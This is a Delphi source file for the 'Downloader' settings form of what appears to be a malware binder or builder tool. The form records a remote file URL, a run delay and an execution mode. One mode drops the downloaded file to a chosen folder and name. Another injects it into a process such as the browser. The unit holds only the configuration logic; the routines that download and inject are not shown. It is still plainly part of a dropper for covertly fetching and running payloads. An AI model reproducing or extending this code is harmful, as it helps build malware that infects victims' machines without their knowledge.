unit U_FrmDownloader;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, AdvSmoothButton, bsSkinBoxCtrls, StdCtrls, bsSkinCtrls, AdvCombo,
  Mask, AdvSmoothLabel, ExtCtrls,ComCtrls;

type
  TFrm_Downloader = class(TForm)
    Panel1: TPanel;
    AdvSmoothLabel2: TAdvSmoothLabel;
    AdvSmoothLabel1: TAdvSmoothLabel;
    AdvSmoothLabel3: TAdvSmoothLabel;
    AdvSmoothLabel4: TAdvSmoothLabel;
    AdvSmoothLabel5: TAdvSmoothLabel;
    FDW_EditFile: TbsSkinEdit;
    FDW_EditParam: TbsSkinEdit;
    FDW_EditlDelay: TbsSkinNumericEdit;
    FDW_ComboExec: TAdvComboBox;
    FDW_GroupBox: TbsSkinGroupBox;
    FDW_L_ExecPath: TbsSkinStdLabel;
    FDW_L_ExecName: TbsSkinStdLabel;
    FDW_C_ExecPath: TbsSkinComboBox;
    FDW_C_ExecName: TbsSkinEdit;
    AdvSmoothButton1: TAdvSmoothButton;
    FE_Cancel: TAdvSmoothButton;
    procedure AdvSmoothButton1Click(Sender: TObject);
    procedure FE_CancelClick(Sender: TObject);
    procedure FDW_ComboExecChange(Sender: TObject);
    procedure FDW_C_ExecPathChange(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Frm_Downloader: TFrm_Downloader;

implementation

{$R *.dfm}
uses
U_Type,U_Utils,U_FrmMain;

procedure TFrm_Downloader.AdvSmoothButton1Click(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
X : String;
Size : Integer;
begin
  if Frm_Downloader.Caption = 'Downloader Add' then
  begin
    if (FDW_EditFile.Text <> '') then
    begin
      Size := GetFileSizeNet(FDW_EditFile.Text);
      if (Size <> 0) then
      begin
        List := Frm_Main.List_Downloader.Items.Add;
        List.Caption := FDW_EditFile.Text;
        List.SubItems.Add(getkbs(Size));
        new(data);
        Data^.Delay := Trunc(FDW_EditlDelay.Value);
        Data^.Exec := FDW_ComboExec.ItemIndex;
        Data^.Path := FDW_C_ExecPath.ItemIndex;
        Data^.Name := FDW_C_ExecName.Text;
        Data^.Parameter := FDW_EditParam.Text;
        List.Data := Data;
        Close;
      end else
        Showmessage('Your File Not Exists In Site, Please Input Correct Link...!!!');
    end else
      Showmessage('Please Input Link First...!!!');
  end else
  if (Pos('oader Edit ',Frm_Downloader.Caption) <> 0) then
  begin
    if (FDW_EditFile.Text <> '') then
    begin
      Size := GetFileSizeNet(FDW_EditFile.Text);
      if (Size <> 0) then
      begin
        X := Frm_Downloader.Caption;
        delete(x,1,16);
        List := Frm_Main.List_Binder.Items.Item[strtoint(x)];
        Data := List.Data;
        List.Caption := FDW_EditFile.Text;
        List.SubItems.Add(getkbs(Size));
        Data^.Delay := Trunc(FDW_EditlDelay.Value);
        Data^.Exec := FDW_ComboExec.ItemIndex;
        Data^.Path := FDW_C_ExecPath.ItemIndex;
        Data^.Name := FDW_C_ExecName.Text;
        Data^.Parameter := FDW_EditParam.Text;
        List.Data := data;
        Close;
      end else
        Showmessage('Your File Not Exists In Site, Please Input Correct Link...!!!');
    end else
      Showmessage('Please Input Link First...!!!');
  end;
end;

procedure TFrm_Downloader.FDW_ComboExecChange(Sender: TObject);
begin
  if FDW_ComboExec.ItemIndex = 0 then
  begin
    FDW_L_ExecName.Enabled := false;
    FDW_L_ExecPath.Enabled := false;
    FDW_C_ExecName.Enabled := false;
    FDW_C_ExecPath.Enabled := false;
    FDW_C_ExecName.Text := '';
    FDW_C_ExecPath.ItemIndex := -1;
  end else
  if FDW_ComboExec.ItemIndex = 1 then
  begin
    FDW_GroupBox.Caption := 'Drop Destination : ';
    FDW_L_ExecName.Enabled := true;
    FDW_C_ExecName.Enabled := true;
    FDW_L_ExecPath.Enabled := true;
    FDW_C_ExecPath.Enabled := true;
    FDW_C_ExecName.Text := '';
    if FDW_C_ExecPath.Items[0] = 'Browser' then
    begin
      FDW_C_ExecPath.Items.Delete(0);
    end;
    FDW_C_ExecPath.ItemIndex := 0;
  end else
  if FDW_ComboExec.ItemIndex = 2 then
  begin
    FDW_GroupBox.Caption := 'Injection To : ';
    FDW_L_ExecPath.Enabled := true;
    FDW_C_ExecPath.Enabled := true;
    FDW_L_ExecName.Enabled := false;
    FDW_C_ExecName.Enabled := false;
    FDW_C_ExecName.Text := '';
    if FDW_C_ExecPath.Items[0] <> 'Browser' then
    begin
      FDW_C_ExecPath.Items.Insert(0,'Browser');
    end;
    FDW_C_ExecPath.ItemIndex := 0;
  end;
end;

procedure TFrm_Downloader.FDW_C_ExecPathChange(Sender: TObject);
begin
  if FDW_C_ExecPath.Text = 'Browser' then
  begin
    FDW_L_ExecName.Enabled := false;
    FDW_C_ExecName.Enabled := false;
  end else
  begin
    FDW_L_ExecName.Enabled := true;
    FDW_C_ExecName.Enabled := true;
  end;
end;

procedure TFrm_Downloader.FE_CancelClick(Sender: TObject);
begin
  Close;
end;

end.
